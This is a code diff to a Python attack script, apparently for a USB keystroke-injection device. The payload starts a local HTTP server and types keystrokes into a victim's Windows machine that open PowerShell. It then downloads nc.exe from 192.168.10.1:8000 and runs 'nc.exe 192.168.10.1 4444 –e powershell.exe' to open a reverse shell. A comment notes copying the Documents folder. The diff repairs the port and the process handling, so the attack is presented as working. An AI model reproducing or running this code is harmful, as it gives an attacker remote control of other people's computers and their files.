@@ -37,22 +37,24 @@ def payload():
 	os.chdir(web_dir)
 	httpHandler = http.server.SimpleHTTPRequestHandler
 	httpd = socketserver.TCPServer(('',8000),httpHandler)
-	httpd.serve_forever()
+	httplistener=Process(target=httpd.serve_forever())
+	httplistener.start()
 	sleep(3)
 	eco.press("LGUI+R")
 	sleep(1)
 	eco.type("powershell")
 	eco.press("ENTER")
 	sleep(1)
-	eco.type("wget http://192.168.10.1/nc.exe -OutFile nc.exe")
+	eco.type("wget http://192.168.10.1:8000/nc.exe -OutFile nc.exe")
 	sleep(5)
 
-	listener=Process(target=reverse_shell_listener)
-	listener.start()
+	shelllistener=Process(target=reverse_shell_listener)
+	shelllistener.start()
 	eco.type("nc.exe 192.168.10.1 4444 –e powershell.exe")
-	listener.join()
+	shelllistener.join()
 	# Copy Documents Directory to Flash Drive
 	httpd.shutdown()
+	httplistener.join()
 
 # Ensures simple gadget is selected
 __location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
